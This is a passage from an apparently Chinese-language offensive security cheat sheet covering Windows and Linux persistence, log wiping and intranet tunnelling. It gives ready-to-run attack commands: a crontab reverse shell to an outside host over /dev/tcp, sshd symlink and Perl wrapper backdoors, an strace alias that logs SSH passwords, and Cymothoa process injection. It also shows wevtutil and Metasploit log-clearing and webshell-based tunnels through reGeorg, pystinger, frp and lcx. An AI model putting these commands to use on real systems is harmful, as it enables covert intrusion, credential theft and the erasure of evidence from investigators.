<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>

<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a target="_blank" rel="noopener" href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5><p>常用方式： InjectDll RedirectShortcut RedirectEXE</p>
<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 </p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a> </p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p>
<p>dll劫持不多说</p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent"></a>18、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent</a></h5><p>编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : <a target="_blank" rel="noopener" href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe"></a>19、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe</a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : <a target="_blank" rel="noopener" href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门 <a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用VSTO实现的office后门</a> <a target="_blank" rel="noopener" href="https://github.com/3gstudent/Office-Persistence">Office加载项</a></p>
<ul>
<li>Word WLL</li>
<li>Excel XLL</li>
<li>Excel VBA add-ins</li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p>
</blockquote>
<blockquote>
<p>参考2 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序 POC:<a target="_blank" rel="noopener" href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>

<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载 Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧——“隐藏”注册表的创建》</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数 POC : <a target="_blank" rel="noopener" href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>

<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用BHO实现IE浏览器劫持</a></h5><h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>

<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure>

<p>链接：ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x32;&#x30;&#54;&#46;&#49;&#52;&#50;">&#114;&#111;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x32;&#x30;&#54;&#46;&#49;&#52;&#50;</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>

<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39;</span><br></pre></td></tr></table></figure>

<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>

<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><ul>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li>
<li>Mafix + Suterusu rootkit</li>
</ul>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Screetsec/Vegile">Vegile</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/icco/backdoor">backdoor</a></li>
</ul>
<h1 id="14-痕迹清理"><a href="#14-痕迹清理" class="headerlink" title="14.痕迹清理"></a>14.痕迹清理</h1><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows日志清除</a></h3><p>获取日志分类列表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>

<p>获取单个日志类别的统计信息： eg.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>

<p>查看指定日志的具体内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe &#x2F;f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>

<h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li>
</ul>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs </span><br><span class="line">clearev </span><br></pre></td></tr></table></figure>

<h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; &#x2F;a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>



<h1 id="15-内网穿透"><a href="#15-内网穿透" class="headerlink" title="15.内网穿透"></a>15.内网穿透</h1><p><strong>区分正向代理与反向代理</strong></p>
<p>A—-b—-C</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理</span><br><span class="line">B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理</span><br><span class="line">反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A</span><br></pre></td></tr></table></figure>



<h4 id="0x01-场景与思路分析"><a href="#0x01-场景与思路分析" class="headerlink" title="0x01 场景与思路分析"></a>0x01 场景与思路分析</h4><h6 id="场景一：内网防火墙对出口流量没有任何端口限制"><a href="#场景一：内网防火墙对出口流量没有任何端口限制" class="headerlink" title="场景一：内网防火墙对出口流量没有任何端口限制"></a>场景一：内网防火墙对出口流量没有任何端口限制</h6><p>思路 <strong>：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell</strong></p>
<h6 id="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）"><a href="#场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）" class="headerlink" title="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）"></a>场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</h6><p>思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</p>
<p><strong>方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</strong></p>
<p><strong>方法二：端口转发</strong></p>
<p><strong>方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网</strong></p>
<p>1.在内网主机上执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -p <span class="number">80</span> root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.230</span></span><br><span class="line">(输入外网主机的SSH口令)</span><br></pre></td></tr></table></figure>

<p>2.在外网主机上执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> -p <span class="number">2222</span> avfisher@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(输入内网主机的SSH口令)</span><br></pre></td></tr></table></figure>

<p>3.在外网主机上配置proxychains设置socks4代理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">[ProxyList]</span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>4.使用proxychains代理所有流量进入内网</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -nv <span class="number">10.0</span><span class="number">.2</span><span class="number">.5</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure>

<h6 id="场景三：TCP不出网-HTTP代理"><a href="#场景三：TCP不出网-HTTP代理" class="headerlink" title="场景三：TCP不出网-HTTP代理"></a>场景三：TCP不出网-HTTP代理</h6><p><strong>一.reGeorg</strong></p>
<p>reGeorg原版：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>reGeorg修改版：<a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<p>假设拿到的Webshell是<a target="_blank" rel="noopener" href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82">http://aaa.com/shell.jsp，</a>以原版reGeorg为例。</p>
<p>上传reGeorg中的 tunnel.jsp，假设当前URL为<a target="_blank" rel="noopener" href="http://aaa.com/tunnel.jsp">http://aaa.com/tunnel.jsp</a></p>
<p>在本地PC运行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http:&#x2F;&#x2F;aaa.com&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure>

<p>此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。</p>
<p><strong>二.pystinger</strong></p>
<p>蜂刺-stinger_client</p>
<p><a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger">pystinger</a></p>
<p>整体结构：</p>
<p>1.上传 proxy.jsp到目标Web服务器，上传stinger_server/stinger_server.exe到目标系统。</p>
<p>2.使用Webshell启动stinger_server</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;stinger_server</span><br><span class="line">nohup &#x2F;tmp&#x2F;stinger_server&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows: start D:&#x2F;XXX&#x2F;stinger_server.exe</span><br></pre></td></tr></table></figure>

<p>3.VPS服务端启动监听</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stinger_client -w http:&#x2F;&#x2F;aaa.com&#x2F;proxy.jsp -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure>


<p>以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。</p>
<p>特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill stinger_server进程 再启动，最后重启VPS服务端stinger_client即可</p>
<h6 id="场景四-TCP出网-socks代理"><a href="#场景四-TCP出网-socks代理" class="headerlink" title="场景四    TCP出网-socks代理"></a>场景四    TCP出网-socks代理</h6><p><strong><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">frp</a></strong></p>
<p>搭建步骤：<br>1.VPS运行服务端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>注：建议用Screen将frp挂起到后台，Screen挂起程序参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b24f597c0561">用screen 在后台运行程序 - 简书</a></p>
<p>frps.ini内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 8080</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line">tcp_mux &#x3D; true</span><br><span class="line">privilege_token &#x3D; token123</span><br><span class="line">kcp_bind_port &#x3D; 8080</span><br></pre></td></tr></table></figure>

<p>2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;frpc-x86</span><br><span class="line">nohup &#x2F;tmp&#x2F;frpc-x86 -c &#x2F;tmpfrpc.ini&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">frpc -c frpc.ini</span><br></pre></td></tr></table></figure>

<p>注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用 <code>python -m SimpleHTTPServer 80</code> 启动一个webserver，然后在客户端使用 <code>curl http://vpsip/frpc</code>下载文件。</p>
<p>以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就可以访问目标内网了。</p>
<p>Proxifier使用参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013600314/article/details/106276126/">Proxifier Socks5 代理（内网访问、远程办公）</a></p>
<p>ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp </p>
<p> <a target="_blank" rel="noopener" href="https://github.com/editso/fuso">fuso</a></p>
<h4 id="0x02-Lcx"><a href="#0x02-Lcx" class="headerlink" title="0x02 Lcx"></a>0x02 Lcx</h4><p>内网IP：192.168.183.168<br>公网IP：192.168.183.181</p>
<h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>内网机器上执行命令：<code>lcx.exe –slave 公网IP 端口 内网IP 端口</code><br>将内网的3389端口转发到公网的6666端口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>



<p>公网机器上执行命令：<code>lcx.exe -listen 监听端口 连接端口</code><br>将在6666端口接收到的数据转发到2222端口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen <span class="number">6666</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>

<p>使用命令<code>mstsc /v:127.0.0.1:2222</code>即可连接到内网3389端口</p>
<h5 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h5><p>如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上<br>内网机器上执行命令：<code>lcx.exe -tran 映射端口 连接IP 连接端口</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">66</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure>

<p>因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发</p>
